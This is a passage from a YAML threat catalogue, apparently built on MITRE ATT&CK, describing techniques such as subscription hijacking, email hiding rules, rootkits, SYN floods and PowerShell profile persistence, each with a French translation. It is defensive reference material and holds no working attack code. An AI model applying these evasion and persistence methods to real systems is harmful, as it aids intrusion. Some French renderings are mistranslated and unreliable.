      \ Administrator account may create new subscriptions in which to deploy resources.\
      \ They may also engage in subscription hijacking by transferring an existing\
      \ pay-as-you-go subscription from a victim tenant to an adversary-controlled\
      \ tenant. This will allow the adversary to use the victim\u2019s compute resources\
      \ without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm\
      \ 2023)(Citation: Microsoft Subscription Hijacking 2022)\n\nIn AWS environments,\
      \ adversaries with appropriate permissions in a given account may call the `LeaveOrganization`\
      \ API, causing the account to be severed from the AWS Organization to which\
      \ it was tied and removing any Service Control Policies, guardrails, or restrictions\
      \ imposed upon it by its former Organization. Alternatively, adversaries may\
      \ call the `CreateAccount` API in order to create a new account within an AWS\
      \ Organization. This account will use the same payment methods registered to\
      \ the payment account but may not be subject to existing detections or Service\
      \ Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)\nhttps://attack.mitre.org/techniques/T1666"
    translations:
      fr:
        name: "Modifier la hi\xE9rarchie des ressources cloud"
        description: "Les adversaires peuvent tenter de modifier les structures hi\xE9\
          rarchiques dans les environnements d'infrastructure en tant que service\
          \ (IaaS) afin d'\xE9chapper aux d\xE9fenses.  \n\nLes environnements IaaS\
          \ regroupent souvent les ressources en une hi\xE9rarchie, permettant une\
          \ meilleure gestion des ressources et une meilleure application des politiques\
          \ aux groupes concern\xE9s. Les structures hi\xE9rarchiques diff\xE8rent\
          \ selon les fournisseurs cloud. Par exemple, dans les environnements AWS,\
          \ plusieurs comptes peuvent \xEAtre regroup\xE9s sous une m\xEAme organisation,\
          \ tandis que dans les environnements Azure, plusieurs abonnements peuvent\
          \ \xEAtre regroup\xE9s dans un seul groupe de gestion. (Citation : AWS Organizations)(Citation\
          \ : Microsoft Azure Resources)\n\nLes adversaires peuvent ajouter, supprimer\
          \ ou modifier autrement des groupes de ressources au sein d'une hi\xE9rarchie\
          \ IaaS. Par exemple, dans les environnements Azure, un adversaire ayant\
          \ obtenu acc\xE8s \xE0 un compte Administrateur Global peut cr\xE9er de\
          \ nouveaux abonnements pour d\xE9ployer des ressources. Ils peuvent \xE9\
          galement s'engager dans un d\xE9tournement d'abonnement en transf\xE9rant\
          \ un abonnement pay-as-you-go existant d'un locataire victime vers un locataire\
          \ contr\xF4l\xE9 par l'adversaire. Cela permettra \xE0 l'adversaire d'utiliser\
          \ les ressources de calcul de la victime sans g\xE9n\xE9rer de journaux\
          \ sur le locataire de la victime. (Citation : Microsoft Peach Sandstorm\
          \ 2023)(Citation : D\xE9tournement d'abonnement Microsoft 2022)\n\nDans\
          \ les environnements AWS, les adversaires disposant des autorisations appropri\xE9\
          es sur un compte donn\xE9 peuvent appeler l'API \xAB LeaveOrganisation \xBB\
          , ce qui entra\xEEne la coupure du compte de l'organisation AWS \xE0 laquelle\
          \ il \xE9tait li\xE9 et supprime toute politique de contr\xF4le de service,\
          \ garde-fouet ou restriction impos\xE9e par son ancienne organisation. Sinon,\
          \ les adversaires peuvent appeler l'API \xAB CreateAccount \xBB afin de\
          \ cr\xE9er un nouveau compte au sein d'une organisation AWS. Ce compte utilisera\
          \ les m\xEAmes m\xE9thodes de paiement enregistr\xE9es sur le compte de\
          \ paiement mais ne sera pas soumis aux d\xE9tections existantes ni aux politiques\
          \ de contr\xF4le de service. (Citation : AWS RE\_:Inforce Threat Detection\
          \ 2024)https://attack.mitre.org/techniques/T1666"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.008
    ref_id: T1564.008
    name: Email Hiding Rules
    description: 'Adversaries may use email rules to hide inbound emails in a compromised
      user''s mailbox. Many email clients allow users to create inbox rules for various
      email functions, including moving emails to other folders, marking emails as
      read, or deleting emails. Rules may be created or modified within email clients
      or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code>
      [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows
      systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation:
      Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)


      Adversaries may utilize email rules within a compromised user''s mailbox to
      delete and/or move emails to less noticeable folders. Adversaries may do this
      to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)
      emails sent from the compromised account.


      Any user or administrator within the organization (or adversary with valid credentials)
      may be able to create rules to automatically move or delete emails. These rules
      can be abused to impair/delay detection had the email content been immediately
      seen by a user or defender. Malicious rules commonly filter out emails based
      on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>,
      and <code>hack</code>) found in message bodies and subject lines. (Citation:
      Microsoft Cloud App Security)


      In some environments, administrators may be able to enable email rules that
      operate organization-wide rather than on individual inboxes. For example, Microsoft
      Exchange supports transport rules that evaluate all mail an organization receives
      against user-specified conditions, then performs a user-specified action on
      mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023)
      Adversaries that abuse such features may be able to automatically modify or
      delete all emails related to specific topics (such as internal security incident
      notifications).

      https://attack.mitre.org/techniques/T1564/008'
    translations:
      fr:
        name: "R\xE8gles de dissimulation des e-mails"
        description: "Les adversaires peuvent utiliser les r\xE8gles d'e-mail pour\
          \ dissimuler les emails entrants dans la bo\xEEte aux lettres d'un utilisateur\
          \ compromis. De nombreux clients de messagerie permettent aux utilisateurs\
          \ de cr\xE9er des r\xE8gles de bo\xEEte de r\xE9ception pour diverses fonctions\
          \ de messagerie, notamment d\xE9placer les emails vers d'autres dossiers,\
          \ marquer les emails comme lus ou supprimer des emails. Les r\xE8gles peuvent\
          \ \xEAtre cr\xE9\xE9es ou modifi\xE9es dans des clients de messagerie ou\
          \ via des fonctionnalit\xE9s externes telles que les cmdlets <code>Nouvelle-InboxRule</code>\
          \ ou <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ sur les syst\xE8mes Windows. (Citation : R\xE8gles de la bo\xEEte de r\xE9\
          ception Microsoft)(Citation : R\xE8gles de messagerie MacOS)(Citation :\
          \ Microsoft New-InboxRule)(Citation : Microsoft Set-InboxRule)\n\nLes adversaires\
          \ peuvent utiliser les r\xE8gles d'e-mail dans la bo\xEEte aux lettres d'un\
          \ utilisateur compromis pour supprimer et/ou d\xE9placer les e-mails vers\
          \ des dossiers moins visibles. Les adversaires peuvent faire cela pour masquer\
          \ les alertes de s\xE9curit\xE9, les communications C2 ou les r\xE9ponses\
          \ aux e-mails [Spearphishing interne](https://attack.mitre.org/techniques/T1534)\
          \ envoy\xE9s depuis le compte compromis.\n\nTout utilisateur ou administrateur\
          \ au sein de l'organisation (ou adversaire disposant d'identifiants valides)\
          \ peut \xEAtre capable de cr\xE9er des r\xE8gles pour d\xE9placer ou supprimer\
          \ automatiquement des e-mails. Ces r\xE8gles peuvent \xEAtre abus\xE9es\
          \ pour compromettre ou retarder la d\xE9tection si le contenu de l'email\
          \ a \xE9t\xE9 imm\xE9diatement vu par un utilisateur ou un d\xE9fenseur.\
          \ Les r\xE8gles malveillantes filtrent couramment les emails en fonction\
          \ de mots-cl\xE9s (tels que <code>malware</code>, <code>suspects</code>,\
          \ <code>phish</code>, et <code>hack</code>) que l'on trouve dans les corps\
          \ des messages et les lignes d'objet. (Citation : S\xE9curit\xE9 des applications\
          \ Microsoft Cloud)\n\nDans certains environnements, les administrateurs\
          \ peuvent \xEAtre capables d'activer des r\xE8gles d'email qui fonctionnent\
          \ \xE0 l'\xE9chelle de l'organisation plut\xF4t que sur des bo\xEEtes de\
          \ r\xE9ception individuelles. Par exemple, Microsoft Exchange prend en charge\
          \ des r\xE8gles de transport qui \xE9valuent tout le courrier qu'une organisation\
          \ re\xE7oit selon des conditions sp\xE9cifi\xE9es par l'utilisateur, puis\
          \ effectue une action sp\xE9cifi\xE9e par l'utilisateur sur le courrier\
          \ qui respecte ces conditions. (Citation : R\xE8gles de flux Microsoft Mail\
          \ 2023) Les adversaires qui abusent de ces fonctionnalit\xE9s peuvent \xEA\
          tre en mesure de modifier ou supprimer automatiquement tous les courriels\
          \ li\xE9s \xE0 des sujets sp\xE9cifiques (comme les notifications d'incidents\
          \ de s\xE9curit\xE9 internes). https\_://attack.mitre.org/techniques/T1564/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1491.002
    ref_id: T1491.002
    name: External Defacement
    description: "An adversary may deface systems external to an organization in an\
      \ attempt to deliver messaging, intimidate, or otherwise mislead an organization\
      \ or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002)\
      \ may ultimately cause users to distrust the systems and to question/discredit\
      \ the system\u2019s integrity. Externally-facing websites are a common victim\
      \ of defacement; often targeted by adversary and hacktivist groups in order\
      \ to push a political message or spread propaganda.(Citation: FireEye Cyber\
      \ Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate\
      \ Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt\
      \ Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002)\
      \ may be used as a catalyst to trigger events, or as a response to actions taken\
      \ by an organization or government. Similarly, website defacement may also be\
      \ used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation:\
      \ Trend Micro Deep Dive Into Defacement)\nhttps://attack.mitre.org/techniques/T1491/002"
    translations:
      fr:
        name: "D\xE9gradation externe"
        description: "Un adversaire peut vandaliser des syst\xE8mes externes \xE0\
          \ une organisation dans une tentative de transmettre des messages, intimider\
          \ ou induire en erreur une organisation ou des utilisateurs. [D\xE9figuration\
          \ externe](https://attack.mitre.org/techniques/T1491/002) peut finalement\
          \ amener les utilisateurs \xE0 se m\xE9fier des syst\xE8mes et \xE0 remettre\
          \ en question ou \xE0 discr\xE9diter l'int\xE9grit\xE9 du syst\xE8me. Les\
          \ sites web orient\xE9s vers l'ext\xE9rieur sont souvent victimes de vandalit\xE9\
          s ; souvent cibl\xE9 par des groupes adversaires et hacktivistes afin de\
          \ diffuser un message politique ou de propager de la propagande. (Citation\
          \ : Menaces cybern\xE9tiques de FireEye pour les industries m\xE9diatiques)(Citation\
          \ : D\xE9claration de Kevin Mandia \xE0 la commission du renseignement du\
          \ S\xE9nat am\xE9ricain)(Citation : Des hackers anonymes d\xE9figurent un\
          \ site gouvernemental russe) [D\xE9figuration externe](https://attack.mitre.org/techniques/T1491/002)\
          \ peut \xEAtre utilis\xE9 comme catalyseur pour d\xE9clencher des \xE9v\xE9\
          nements, ou comme r\xE9ponse aux actions entreprises par une organisation\
          \ ou un gouvernement. De m\xEAme, la d\xE9gradation de sites web peut aussi\
          \ servir de mise en place, ou de pr\xE9curseur, pour de futures attaques\
          \ telles que [Compromission en voiture](https://attack.mitre.org/techniques/T1189).\
          \ (Citation : Plong\xE9e approfondie dans Trend Micro sur la d\xE9gradation)https://attack.mitre.org/techniques/T1491/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.013
    ref_id: T1027.013
    name: Encrypted/Encoded File
    description: "Adversaries may encrypt or encode files to obfuscate strings, bytes,\
      \ and other specific patterns to impede detection. Encrypting and/or encoding\
      \ file content aims to conceal malicious artifacts within a file used in an\
      \ intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
      \ [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded\
      \ Payloads](https://attack.mitre.org/techniques/T1027/009), share this same\
      \ broad objective. Encrypting and/or encoding files could lead to a lapse in\
      \ detection of static signatures, only for this malicious content to be revealed\
      \ (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140))\
      \ at the time of execution/use.\n\nThis type of file obfuscation can be applied\
      \ to many file artifacts present on victim hosts, such as malware log/configuration\
      \ and payload files.(Citation: File obfuscation) Files can be encrypted with\
      \ a hardcoded or user-supplied key, as well as otherwise obfuscated using standard\
      \ encoding schemes such as Base64.\n\nThe entire content of a file may be obfuscated,\
      \ or just specific functions or values (such as C2 addresses). Encryption and\
      \ encoding may also be applied in redundant layers for additional protection.\n\
      \nFor example, adversaries may abuse password-protected Word documents or self-extracting\
      \ (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ payload. These files typically function by attaching the intended archived\
      \ content to a decompressor stub that is executed when the file is invoked (e.g.,\
      \ [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX\
      \ - Encrypted/Encoded File) \n\nAdversaries may also abuse file-specific as\
      \ well as custom encoding schemes. For example, Byte Order Mark (BOM) headers\
      \ in text files may be abused to manipulate and obfuscate file content until\
      \ [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\
      \ execution.\nhttps://attack.mitre.org/techniques/T1027/013"
    translations:
      fr:
        name: "Fichier chiffr\xE9/encod\xE9"
        description: "Les adversaires peuvent chiffrer ou encoder des fichiers pour\
          \ obscurcir des cha\xEEnes, des octets et d'autres motifs sp\xE9cifiques\
          \ afin d'entraver la d\xE9tection. Le chiffrement et/ou l'encodage du contenu\
          \ des fichiers vise \xE0 dissimuler des artefacts malveillants dans un fichier\
          \ utilis\xE9 lors d'une intrusion. De nombreuses autres techniques, telles\
          \ que le [Software Packing](https://attack.mitre.org/techniques/T1027/002),\
          \ la [Steganography](https://attack.mitre.org/techniques/T1027/003) et les\
          \ [Chargements utiles embarqu\xE9s](https://attack.mitre.org/techniques/T1027/009),\
          \ partagent ce m\xEAme objectif large. Le chiffrement et/ou l'encodage de\
          \ fichiers pouvait entra\xEEner une interruption de d\xE9tection de signatures\
          \ statiques, pour que ce contenu malveillant soit r\xE9v\xE9l\xE9 (c'est-\xE0\
          -dire [D\xE9obfuser/D\xE9coder des fichiers ou informations](https://attack.mitre.org/techniques/T1140))\
          \ au moment de l'ex\xE9cution/utilisation.\n\nCe type d'obfuscation de fichiers\
          \ peut \xEAtre appliqu\xE9 \xE0 de nombreux artefacts de fichiers pr\xE9\
          sents sur les h\xF4tes victimes, tels que les fichiers de journaux/configuration\
          \ et de charge utile des malwares. (Citation : Brouillage de fichiers) Les\
          \ fichiers peuvent \xEAtre chiffr\xE9s avec une cl\xE9 cod\xE9e en dur ou\
          \ fournie par l'utilisateur, ainsi que d'autres \xE9l\xE9ments obscurcis\
          \ \xE0 l'aide de sch\xE9mas d'encodage standards tels que Base64.\n\nL'ensemble\
          \ du contenu d'un fichier peut \xEAtre obfusqu\xE9, ou simplement des fonctions\
          \ ou des valeurs sp\xE9cifiques (comme les adresses C2). Le chiffrement\
          \ et l'encodage peuvent \xE9galement \xEAtre appliqu\xE9s dans des couches\
          \ redondantes pour une protection suppl\xE9mentaire.\n\nPar exemple, les\
          \ adversaires peuvent abuser de documents Word prot\xE9g\xE9s par mot de\
          \ passe ou d'archives auto-extractibles (SFX) comme m\xE9thode de chiffrement/encodage\
          \ d'un fichier tel qu'une charge utile [Phishing](https://attack.mitre.org/techniques/T1566).\
          \ Ces fichiers fonctionnent g\xE9n\xE9ralement en attachant le contenu archiv\xE9\
          \ pr\xE9vu \xE0 un stub de d\xE9compresseur ex\xE9cut\xE9 lors de l'invocation\
          \ du fichier (par exemple, [User Execution](https://attack.mitre.org/techniques/T1204)).\
          \ (Citation : SFX - Fichier chiffr\xE9/cod\xE9) \n\nLes adversaires peuvent\
          \ \xE9galement abuser des sch\xE9mas d'encodage sp\xE9cifiques \xE0 un fichier\
          \ ainsi que des sch\xE9mas personnalis\xE9s. Par exemple, les en-t\xEAtes\
          \ Byte Order Mark (BOM) dans les fichiers texte peuvent \xEAtre abus\xE9\
          s pour manipuler et obscurcir le contenu des fichiers jusqu'\xE0 l'ex\xE9\
          cution de [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).https\_\
          ://attack.mitre.org/techniques/T1027/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.005
    ref_id: T1590.005
    name: IP Addresses
    description: 'Adversaries may gather the victim''s IP addresses that can be used
      during targeting. Public IP addresses may be allocated to organizations by block,
      or a range of sequential addresses. Information about assigned IP addresses
      may include a variety of details, such as which IP addresses are in use. IP
      addresses may also enable an adversary to derive other details about a victim,
      such as organizational size, physical location(s), Internet service provider,
      and or where/how their publicly-facing infrastructure is hosted.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about assigned IP addresses may also be exposed to adversaries via online or
      other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:
      WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1590/005'
    translations:
      fr:
        name: Adresses IP
        description: "Les adversaires peuvent recueillir les adresses IP de la victime\
          \ qui peuvent \xEAtre utilis\xE9es lors du ciblage. Les adresses IP publiques\
          \ peuvent \xEAtre attribu\xE9es aux organisations par bloc, ou par une gamme\
          \ d'adresses s\xE9quentielles. Les informations sur les adresses IP attribu\xE9\
          es peuvent inclure une vari\xE9t\xE9 de d\xE9tails, comme les adresses IP\
          \ utilis\xE9es. Les adresses IP peuvent \xE9galement permettre \xE0 un adversaire\
          \ d'obtenir d'autres d\xE9tails sur une victime, tels que la taille de l'organisation,\
          \ l'emplacement physique, le fournisseur d'acc\xE8s Internet, ou la mani\xE8\
          re dont son infrastructure accessible au public est h\xE9berg\xE9e.\n\n\
          Les adversaires peuvent recueillir ces informations de diff\xE9rentes mani\xE8\
          res, comme par des actions de collecte directe via [Scan Actif](https://attack.mitre.org/techniques/T1595)\
          \ ou [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur les adresses IP attribu\xE9es peuvent \xE9galement\
          \ \xEAtre expos\xE9es aux adversaires via des ensembles de donn\xE9es en\
          \ ligne ou d'autres jeux de donn\xE9es accessibles (ex : [Search Open Technical\
          \ Databases](https://attack.mitre.org/techniques/T1596)). (Citation : WHOIS)(Citation\
          \ : Conteneur DNS)(Citation : DNS passif circulaire) La collecte de ces\
          \ informations peut r\xE9v\xE9ler d'autres formes de reconnaissance (ex\
          \ : [Scan actif](https://attack.mitre.org/techniques/T1595) ou [Rechercher\
          \ des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ l'\xE9tablissement de ressources op\xE9rationnelles (ex : [Acquisition\
          \ d'infrastructure](https://attack.mitre.org/techniques/T1583) ou [Infrastructure\
          \ de compromis](https://attack.mitre.org/techniques/T1584)), et/ou d'acc\xE8\
          s initial (ex : [Remote externe Services](https://attack.mitre.org/techniques/T1133)).https\_\
          ://attack.mitre.org/techniques/T1590/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.001
    ref_id: T1499.001
    name: OS Exhaustion Flood
    description: 'Adversaries may launch a denial of service (DoS) attack targeting
      an endpoint''s operating system (OS). A system''s OS is responsible for managing
      the finite resources as well as preventing the entire system from being overwhelmed
      by excessive demands on its capacity. These attacks do not need to exhaust the
      actual resources on a system; the attacks may simply exhaust the limits and
      available resources that an OS self-imposes.


      Different ways to achieve this exist, including TCP state-exhaustion attacks
      such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)
      With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP
      handshake is never completed. Because each OS has a maximum number of concurrent
      TCP connections that it will allow, this can quickly exhaust the ability of
      the system to receive new requests for TCP connections, thus preventing access
      to any TCP service provided by the server.(Citation: Cloudflare SynFlood)


      ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK
      packets are sent to the target. This forces the OS to search its state table
      for a related TCP connection that has already been established. Because the
      ACK packets are for connections that do not exist, the OS will have to search
      the entire state table to confirm that no match exists. When it is necessary
      to do this for a large flood of packets, the computational requirements can
      cause the server to become sluggish and/or unresponsive, due to the work it
      must do to eliminate the rogue ACK packets. This greatly reduces the resources
      available for providing the targeted service.(Citation: Corero SYN-ACKflood)

      https://attack.mitre.org/techniques/T1499/001'
    translations:
      fr:
        name: "Inondation d'\xE9puisement du syst\xE8me d'exploitation"
        description: "Les adversaires peuvent lancer une attaque par d\xE9ni de service\
          \ (DoS) visant le syst\xE8me d'exploitation (OS) d'un point de terminaison.\
          \ Le syst\xE8me d'exploitation d'un syst\xE8me est responsable de la gestion\
          \ des ressources finies ainsi que de l'emp\xEAchement que l'ensemble du\
          \ syst\xE8me soit submerg\xE9 par des exigences excessives sur sa capacit\xE9\
          . Ces attaques n'ont pas besoin d'\xE9puiser les ressources r\xE9elles d'un\
          \ syst\xE8me ; les attaques peuvent simplement \xE9puiser les limites et\
          \ les ressources disponibles qu'un syst\xE8me d'exploitation s'impose lui-m\xEA\
          me.\n\nDiff\xE9rentes fa\xE7ons d'y parvenir existent, notamment des attaques\
          \ d'\xE9puisement d'\xE9tat TCP telles que les inondations SYN et les inondations\
          \ ACK. (Citation : Arbor AnnualDoSreport janvier 2018) Avec les inondations\
          \ SYN, des quantit\xE9s excessives de paquets SYN sont envoy\xE9es, mais\
          \ la n\xE9gociation TCP \xE0 3 voies n'est jamais achev\xE9e. Parce que\
          \ chaque syst\xE8me d'exploitation dispose d'un nombre maximal de connexions\
          \ TCP simultan\xE9es autoris\xE9es, cela peut rapidement \xE9puiser la capacit\xE9\
          \ du syst\xE8me \xE0 recevoir de nouvelles requ\xEAtes pour les connexions\
          \ TCP, emp\xEAchant ainsi l'acc\xE8s \xE0 tout service TCP fourni par le\
          \ serveur. (Citation : Cloudflare SynFlood)\n\nLes inondations ACK tirent\
          \ parti de la nature \xE9tatique du protocole TCP. Un flot de paquets ACK\
          \ est envoy\xE9 \xE0 la cible. Cela oblige le syst\xE8me d'exploitation\
          \ \xE0 rechercher dans sa table d'\xE9tat une connexion TCP associ\xE9e\
          \ d\xE9j\xE0 \xE9tablie. Comme les paquets ACK concernent des connexions\
          \ qui n'existent pas, le syst\xE8me d'exploitation devra rechercher toute\
          \ la table d'\xE9tat pour confirmer qu'aucune correspondance n'existe. Lorsqu'il\
          \ est n\xE9cessaire de faire cela pour un grand flot de paquets, les exigences\
          \ de calcul peuvent rendre le serveur lent et/ou non r\xE9actif, en raison\
          \ du travail n\xE9cessaire pour \xE9liminer les paquets ACK malveillants.\
          \ Cela r\xE9duit consid\xE9rablement les ressources disponibles pour fournir\
          \ le service cibl\xE9. (Citation : Corero SYN-ACKflood) https://attack.mitre.org/techniques/T1499/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1014
    ref_id: T1014
    name: Rootkit
    description: "Adversaries may use rootkits to hide the presence of programs, files,\
      \ network connections, services, drivers, and other system components. Rootkits\
      \ are programs that hide the existence of malware by intercepting/hooking and\
      \ modifying operating system API calls that supply system information. (Citation:\
      \ Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality\
      \ may reside at the user or kernel level in the operating system or lower, to\
      \ include a hypervisor or [System Firmware](https://attack.mitre.org/techniques/T1542/001).\
      \ (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux,\
      \ and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat\
      \ Mac OSX Rootkit)\n\nRootkits that reside or modify boot sectors are known\
      \ as [Bootkit](https://attack.mitre.org/techniques/T1542/003)s and specifically\
      \ target the boot process of the operating system.\nhttps://attack.mitre.org/techniques/T1014"
    translations:
      fr:
        name: Rootkit
        description: "Les adversaires peuvent utiliser des rootkits pour dissimuler\
          \ la pr\xE9sence de programmes, fichiers, connexions r\xE9seau, services,\
          \ pilotes et autres composants syst\xE8me. Les rootkits sont des programmes\
          \ qui masquent l'existence de malwares en interceptant/accrochent et modifiant\
          \ les appels API du syst\xE8me d'exploitation qui fournissent des informations\
          \ syst\xE8me. (Citation : Symantec Windows Rootkits) \n\nLes rootkits ou\
          \ fonctionnalit\xE9s activant rootkit peuvent r\xE9sider au niveau de l'utilisateur\
          \ ou du noyau dans le syst\xE8me d'exploitation ou dans une version inf\xE9\
          rieure, y compris un hyperviseur ou un [firmware syst\xE8me](https://attack.mitre.org/techniques/T1542/001).\
          \ (Citation : Wikip\xE9dia Rootkit) Des rootkits ont \xE9t\xE9 vus pour\
          \ Windows, Linux et Mac OS X. (Citation : Rootkit Linux CrowdStrike) (Citation\
          \ : BlackHat Mac OSX Rootkit)\n\nLes rootkits qui r\xE9sident ou modifient\
          \ les secteurs de d\xE9marrage sont appel\xE9s [Bootkit](https://attack.mitre.org/techniques/T1542/003)\
          \ et ciblent sp\xE9cifiquement le processus de d\xE9marrage du syst\xE8\
          me d'exploitation.https\_://attack.mitre.org/techniques/T1014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1546.013
    ref_id: T1546.013
    name: PowerShell Profile
    description: "Adversaries may gain persistence and elevate privileges by executing\
      \ malicious content triggered by PowerShell profiles. A PowerShell profile \
      \ (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ starts and can be used as a logon script to customize user environments.\n\
      \n[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several\
      \ profiles depending on the user or host program. For example, there can be\
      \ different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ host programs such as the PowerShell console, PowerShell ISE or Visual Studio\
      \ Code. An administrator can also configure a profile that applies to all users\
      \ and host programs on the local computer. (Citation: Microsoft About Profiles)\
      \ \n\nAdversaries may modify these profiles to include arbitrary commands, functions,\
      \ modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ session the modified script will be executed unless the <code>-NoProfile</code>\
      \ flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019)\
      \ \n\nAn adversary may also be able to escalate privileges if a script in a\
      \ PowerShell profile is loaded and executed by an account with higher privileges,\
      \ such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)\n\
      https://attack.mitre.org/techniques/T1546/013"
    translations:
      fr:
        name: Profil PowerShell
        description: "Les adversaires peuvent gagner en persistance et augmenter leurs\
          \ privil\xE8ges en ex\xE9cutant du contenu malveillant d\xE9clench\xE9 par\
          \ des profils PowerShell. Un profil PowerShell (<code>profile.ps1</code>)\
          \ est un script qui s'ex\xE9cute lorsque [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ d\xE9marre et peut \xEAtre utilis\xE9 comme script de connexion pour personnaliser\
          \ les environnements utilisateur.\n\n[PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ prend en charge plusieurs profils selon l'utilisateur ou le programme\
          \ h\xF4te. Par exemple, il peut exister diff\xE9rents profils pour les programmes\
          \ h\xF4tes [PowerShell](https://attack.mitre.org/techniques/T1059/001) tels\
          \ que la console PowerShell, PowerShell ISE ou Visual Studio Code. Un administrateur\
          \ peut \xE9galement configurer un profil qui s'applique \xE0 tous les utilisateurs\
          \ et programmes h\xF4tes sur l'ordinateur local. (Citation : Microsoft \xE0\
          \ propos des profils) \n\nLes adversaires peuvent modifier ces profils pour\
          \ inclure des commandes, fonctions, modules et/ou disques [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
          \ arbitraires afin de gagner en persistance. Chaque fois qu'un utilisateur\
          \ ouvre une session [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
          \ le script modifi\xE9 sera ex\xE9cut\xE9, sauf si le drapeau <code>-NoProfile</code>\
          \ est utilis\xE9 lors du lancement. (Citation : ESET Turla PowerShell mai\
          \ 2019) \n\nUn adversaire peut \xE9galement \xEAtre capable d'escalader\
          \ des privil\xE8ges si un script dans un profil PowerShell est charg\xE9\
          \ et ex\xE9cut\xE9 par un compte disposant de privil\xE8ges sup\xE9rieurs,\
          \ comme un administrateur de domaine. (Citation : Profils PowerShell douteux\
          \ et de Wits End) https://attack.mitre.org/techniques/T1546/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1059.007
    ref_id: T1059.007
    name: JavaScript
    description: "Adversaries may abuse various implementations of JavaScript for\
      \ execution. JavaScript (JS) is a platform-independent scripting language (compiled\
      \ just-in-time at runtime) commonly associated with scripts in webpages, though\
      \ JS can be executed in runtime environments outside the browser.(Citation:\
      \ NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard.\
      \ JScript is interpreted via the Windows Script engine and thus integrated with\
      \ many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001)\
      \ and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation:\
      \ Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript\
      \ for Automation (JXA) is a macOS scripting language based on JavaScript, included\
      \ as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced\
      \ in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control\
      \ applications, interface with the operating system, and bridge access into\
      \ the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports\
      \ two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002).\
      \ Scripts can be executed via the command line utility <code>osascript</code>,\
      \ they can be compiled into applications or script files via <code>osacompile</code>,\
      \ and they can be compiled and executed in memory of other programs by leveraging\
      \ the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation:\
      \ SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary\
      \ Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries\
      \ may abuse various implementations of JavaScript to execute various behaviors.\
      \ Common uses include hosting malicious scripts on websites as part of a [Drive-by\
